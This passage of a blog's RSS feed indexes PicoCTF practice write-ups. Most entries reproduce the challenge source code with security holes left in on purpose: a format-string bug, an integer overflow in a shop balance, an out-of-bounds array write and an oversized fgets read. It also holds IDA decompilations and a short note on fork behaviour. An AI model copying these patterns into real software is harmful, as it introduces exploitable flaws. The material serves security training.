&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - flag leak</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---flag-leak/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---flag-leak/</guid><description>&lt;h1 id="picoctf---flag-leak">
 PicoCTF - flag leak
 &lt;a class="anchor" href="#picoctf---flag-leak">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Format String Bug
&lt;img src="https://hackmd.io/_uploads/BkqBmpOih.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/SyvLXauon.png" alt="" />&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;wchar.h&amp;gt;
#include &amp;lt;locale.h&amp;gt;

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;,&amp;#34;r&amp;#34;);
 if (f == NULL) {
 printf(&amp;#34;%s %s&amp;#34;, &amp;#34;Please create &amp;#39;flag.txt&amp;#39; in this directory with your&amp;#34;,
 &amp;#34;own debugging flag.\n&amp;#34;);
 exit(0);
 }

 fgets(buf,len,f); // size bound read
}

void vuln(){
 char flag[BUFSIZE];
 char story[128];

 readflag(flag, FLAGSIZE);

 printf(&amp;#34;Tell me a story and then I&amp;#39;ll tell you one &amp;gt;&amp;gt; &amp;#34;);
 scanf(&amp;#34;%127s&amp;#34;, story);
 printf(&amp;#34;Here&amp;#39;s a story - \n&amp;#34;);
 printf(story);
 printf(&amp;#34;\n&amp;#34;);
}

int main(int argc, char **argv){

 setvbuf(stdout, NULL, _IONBF, 0);
 
 // Set the gid to the effective gid
 // this prevents /bin/sh from dropping the privileges
 gid_t gid = getegid();
 setresgid(gid, gid, gid);
 vuln();
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - flag_shop</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/general-skills/picoctf---flag_shop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/general-skills/picoctf---flag_shop/</guid><description>&lt;h1 id="picoctf---flag_shop">
 PicoCTF - flag_shop
 &lt;a class="anchor" href="#picoctf---flag_shop">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-general-skill">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>General Skill&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-general-skill">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Bof&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
int main()
{
 setbuf(stdout, NULL);
 int con;
 con = 0;
 int account_balance = 1100;
 while(con == 0){
 
 printf(&amp;#34;Welcome to the flag exchange\n&amp;#34;);
 printf(&amp;#34;We sell flags\n&amp;#34;);

 printf(&amp;#34;\n1. Check Account Balance\n&amp;#34;);
 printf(&amp;#34;\n2. Buy Flags\n&amp;#34;);
 printf(&amp;#34;\n3. Exit\n&amp;#34;);
 int menu;
 printf(&amp;#34;\n Enter a menu selection\n&amp;#34;);
 fflush(stdin);
 scanf(&amp;#34;%d&amp;#34;, &amp;amp;menu);
 if(menu == 1){
 printf(&amp;#34;\n\n\n Balance: %d \n\n\n&amp;#34;, account_balance);
 }
 else if(menu == 2){
 printf(&amp;#34;Currently for sale\n&amp;#34;);
 printf(&amp;#34;1. Defintely not the flag Flag\n&amp;#34;);
 printf(&amp;#34;2. 1337 Flag\n&amp;#34;);
 int auction_choice;
 fflush(stdin);
 scanf(&amp;#34;%d&amp;#34;, &amp;amp;auction_choice);
 if(auction_choice == 1){
 printf(&amp;#34;These knockoff Flags cost 900 each, enter desired quantity\n&amp;#34;);
 
 int number_flags = 0;
 fflush(stdin);
 scanf(&amp;#34;%d&amp;#34;, &amp;amp;number_flags);
 if(number_flags &amp;gt; 0){
 int total_cost = 0;
 total_cost = 900*number_flags;
 printf(&amp;#34;\nThe final cost is: %d\n&amp;#34;, total_cost);
 if(total_cost &amp;lt;= account_balance){
 account_balance = account_balance - total_cost;
 printf(&amp;#34;\nYour current balance after transaction: %d\n\n&amp;#34;, account_balance);
 }
 else{
 printf(&amp;#34;Not enough funds to complete purchase\n&amp;#34;);
 }
 
 
 }
 
 
 
 
 }
 else if(auction_choice == 2){
 printf(&amp;#34;1337 flags cost 100000 dollars, and we only have 1 in stock\n&amp;#34;);
 printf(&amp;#34;Enter 1 to buy one&amp;#34;);
 int bid = 0;
 fflush(stdin);
 scanf(&amp;#34;%d&amp;#34;, &amp;amp;bid);
 
 if(bid == 1){
 
 if(account_balance &amp;gt; 100000){
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;, &amp;#34;r&amp;#34;);
 if(f == NULL){

 printf(&amp;#34;flag not found: please run this on the server\n&amp;#34;);
 exit(0);
 }
 char buf[64];
 fgets(buf, 63, f);
 printf(&amp;#34;YOUR FLAG IS: %s\n&amp;#34;, buf);
 }
 
 else{
 printf(&amp;#34;\nNot enough funds for transaction\n\n\n&amp;#34;);
 }}

 }
 }
 else{
 con = 1;
 }

 }
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Forky</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---forky/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---forky/</guid><description>&lt;h1 id="picoctf---forky">
 PicoCTF - Forky
 &lt;a class="anchor" href="#picoctf---forky">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://burweisnote.blogspot.com/2017/09/fork.html"> fork用法與範例 &lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>Main Function From IDA&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _DWORD &lt;span style="color:#f92672">*&lt;/span>v4; &lt;span style="color:#75715e">// [esp+8h] [ebp-Ch]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> mmap(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">4u&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>, &lt;span style="color:#ae81ff">33&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1000000000&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fork();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fork();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fork();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fork();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1234567890&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> doNothing(&lt;span style="color:#f92672">*&lt;/span>v4);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題很有趣，有了background之後其實對這一題的想法差不多就和&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>差不多，也就是parent process fork出child process後會繼續往下fork出grandchild process，直到parent process執行完成&lt;/p>
&lt;blockquote>
&lt;pre tabindex="0">&lt;code>+ 
| 
+-----------------------------------+ 
| | 
+-----------------+ +-----------------+ 
| | | | 
+--------+ +--------+ +--------+ +--------+ 
| | | | | | | | 
+---+ +---+ +---+ +---+ +---+ +---+ +---+ +---+ 
| | | | | | | | | | | | | | | | 
O O O O O O O O O O O O O O O O 
&lt;/code>&lt;/pre>&lt;/blockquote>
&lt;p>而且他們所操作的外部記憶體對象都會是一樣的，代表*v4最終會被加16次，只是我沒有考慮到負號的問題，因為該題是32bits，代表加到一定程度會overflow，所以都沒解出來&lt;/p></description></item><item><title>PicoCTF - function overwrite</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---function-overwrite/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---function-overwrite/</guid><description>&lt;h1 id="picoctf---function-overwrite">
 PicoCTF - function overwrite
 &lt;a class="anchor" href="#picoctf---function-overwrite">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Array Bound&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;wchar.h&amp;gt;
#include &amp;lt;locale.h&amp;gt;

#define BUFSIZE 64
#define FLAGSIZE 64

int calculate_story_score(char *story, size_t len)
{
 int score = 0;
 for (size_t i = 0; i &amp;lt; len; i++)
 {
 score += story[i];
 }

 return score;
}

void easy_checker(char *story, size_t len)
{
 if (calculate_story_score(story, len) == 1337)
 {
 char buf[FLAGSIZE] = {0};
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;, &amp;#34;r&amp;#34;);
 if (f == NULL)
 {
 printf(&amp;#34;%s %s&amp;#34;, &amp;#34;Please create &amp;#39;flag.txt&amp;#39; in this directory with your&amp;#34;,
 &amp;#34;own debugging flag.\n&amp;#34;);
 exit(0);
 }

 fgets(buf, FLAGSIZE, f); // size bound read
 printf(&amp;#34;You&amp;#39;re 1337. Here&amp;#39;s the flag.\n&amp;#34;);
 printf(&amp;#34;%s\n&amp;#34;, buf);
 }
 else
 {
 printf(&amp;#34;You&amp;#39;ve failed this class.&amp;#34;);
 }
}

void hard_checker(char *story, size_t len)
{
 if (calculate_story_score(story, len) == 13371337)
 {
 char buf[FLAGSIZE] = {0};
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;, &amp;#34;r&amp;#34;);
 if (f == NULL)
 {
 printf(&amp;#34;%s %s&amp;#34;, &amp;#34;Please create &amp;#39;flag.txt&amp;#39; in this directory with your&amp;#34;,
 &amp;#34;own debugging flag.\n&amp;#34;);
 exit(0);
 }

 fgets(buf, FLAGSIZE, f); // size bound read
 printf(&amp;#34;You&amp;#39;re 13371337. Here&amp;#39;s the flag.\n&amp;#34;);
 printf(&amp;#34;%s\n&amp;#34;, buf);
 }
 else
 {
 printf(&amp;#34;You&amp;#39;ve failed this class.&amp;#34;);
 }
}

void (*check)(char*, size_t) = hard_checker;
int fun[10] = {0};

void vuln()
{
 char story[128];
 int num1, num2;

 printf(&amp;#34;Tell me a story and then I&amp;#39;ll tell you if you&amp;#39;re a 1337 &amp;gt;&amp;gt; &amp;#34;);
 scanf(&amp;#34;%127s&amp;#34;, story);
 printf(&amp;#34;On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n&amp;#34;);
 scanf(&amp;#34;%d %d&amp;#34;, &amp;amp;num1, &amp;amp;num2);

 if (num1 &amp;lt; 10)
 {
 fun[num1] += num2;
 }

 check(story, strlen(story));
}
 
int main(int argc, char **argv)
{

 setvbuf(stdout, NULL, _IONBF, 0);

 // Set the gid to the effective gid
 // this prevents /bin/sh from dropping the privileges
 gid_t gid = getegid();
 setresgid(gid, gid, gid);
 vuln();
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - gogo</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---gogo/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---gogo/</guid><description>&lt;h1 id="picoctf---gogo">
 PicoCTF - gogo
 &lt;a class="anchor" href="#picoctf---gogo">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">// main.main
void __cdecl main_main()
{
 _slice_interface_ typ[2]; // [esp+0h] [ebp-58h] BYREF
 string *second_flag; // [esp+20h] [ebp-38h]
 string *flag; // [esp+24h] [ebp-34h]
 _slice_interface_ v3; // [esp+28h] [ebp-30h] BYREF
 string *v4; // [esp+34h] [ebp-24h]
 _DWORD v5[2]; // [esp+38h] [ebp-20h] BYREF
 _DWORD v6[2]; // [esp+40h] [ebp-18h] BYREF
 _slice_interface_ v7; // [esp+48h] [ebp-10h] BYREF
 string *v8; // [esp+54h] [ebp-4h]

 flag = runtime_newobject(&amp;amp;RTYPE_string_0);
 typ[0].array = &amp;#34;Enter Password: &amp;#34;;
 typ[0].len = 16;
 memset(&amp;amp;typ[0].cap, 0, sizeof(_slice_interface_));
 fmt_Printf(*&amp;amp;typ[0].array, *&amp;amp;typ[0].cap);
 v6[0] = &amp;amp;RTYPE__ptr_string;
 v6[1] = flag;
 typ[0].array = &amp;#34;%s\n&amp;#34;;
 typ[0].len = 3;
 typ[0].cap = v6;
 *&amp;amp;typ[1].array = 0x100000001LL;
 fmt_Scanf(*&amp;amp;typ[0].array, *&amp;amp;typ[0].cap);
 if ( main_checkPassword(*flag) )
 {
 v5[0] = &amp;amp;RTYPE_string_0;
 v5[1] = &amp;amp;main_statictmp_0;
 typ[0].array = v5;
 *&amp;amp;typ[0].len = 0x100000001LL;
 fmt_Println(typ[0]);
 v3.cap = &amp;amp;RTYPE_string_0;
 v4 = &amp;amp;main_statictmp_1;
 typ[0].array = &amp;amp;v3.cap;
 *&amp;amp;typ[0].len = 0x100000001LL;
 fmt_Println(typ[0]);
 v3.array = &amp;amp;RTYPE_string_0;
 v3.len = &amp;amp;main_statictmp_2;
 typ[0].array = &amp;amp;v3;
 *&amp;amp;typ[0].len = 0x100000001LL;
 fmt_Println(typ[0]);
 second_flag = runtime_newobject(&amp;amp;RTYPE_string_0);
 v7.cap = &amp;amp;RTYPE__ptr_string;
 v8 = second_flag;
 typ[0].array = &amp;#34;%s\n&amp;#34;;
 typ[0].len = 3;
 typ[0].cap = &amp;amp;v7.cap;
 *&amp;amp;typ[1].array = 0x100000001LL;
 fmt_Scanf(*&amp;amp;typ[0].array, *&amp;amp;typ[0].cap);
 main_ambush(*second_flag);
 runtime_deferproc(0, &amp;amp;stru_81046A0);
 }
 else
 {
 v7.array = &amp;amp;RTYPE_string_0;
 v7.len = &amp;amp;main_statictmp_3;
 typ[0].array = &amp;amp;v7;
 *&amp;amp;typ[0].len = 0x100000001LL;
 fmt_Println(typ[0]);
 }
 runtime_deferreturn(typ[0].array);
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Guessing Game 1</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---guessing-game-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---guessing-game-1/</guid><description>&lt;h1 id="picoctf---guessing-game-1">
 PicoCTF - Guessing Game 1
 &lt;a class="anchor" href="#picoctf---guessing-game-1">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>ROP Chain
&lt;a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux System Call Table for x86 64&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/stat.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define BUFSIZE 100
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">increment&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> in) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> in &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">get_random&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> rand() &lt;span style="color:#f92672">%&lt;/span> BUFSIZE;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">do_stuff&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">long&lt;/span> ans &lt;span style="color:#f92672">=&lt;/span> get_random();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	ans &lt;span style="color:#f92672">=&lt;/span> increment(ans);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> res &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;What number would you like to guess?&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> guess[BUFSIZE];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	fgets(guess, BUFSIZE, stdin);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">long&lt;/span> g &lt;span style="color:#f92672">=&lt;/span> atol(guess);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>g) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;That&amp;#39;s not a valid number!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	} &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (g &lt;span style="color:#f92672">==&lt;/span> ans) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			printf(&lt;span style="color:#e6db74">&amp;#34;Congrats! You win! Your prize is this print statement!&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			res &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		} &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			printf(&lt;span style="color:#e6db74">&amp;#34;Nope!&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> res;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">win&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> winner[BUFSIZE];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;New winner!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">Name? &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	fgets(winner, &lt;span style="color:#ae81ff">360&lt;/span>, stdin);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Congrats %s&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, winner);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, NULL, _IONBF, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#75715e">// Set the gid to the effective gid
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	&lt;span style="color:#75715e">// this prevents /bin/sh from dropping the privileges
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	gid_t gid &lt;span style="color:#f92672">=&lt;/span> getegid();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setresgid(gid, gid, gid);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> res;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Welcome to my guessing game!&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#ae81ff">1&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		res &lt;span style="color:#f92672">=&lt;/span> do_stuff();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (res) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			win();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Guessing Game 2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---guessing-game-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---guessing-game-2/</guid><description>&lt;h1 id="picoctf---guessing-game-2">
 PicoCTF - Guessing Game 2
 &lt;a class="anchor" href="#picoctf---guessing-game-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>fmt / leak libc / ret2libc / leak canary&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
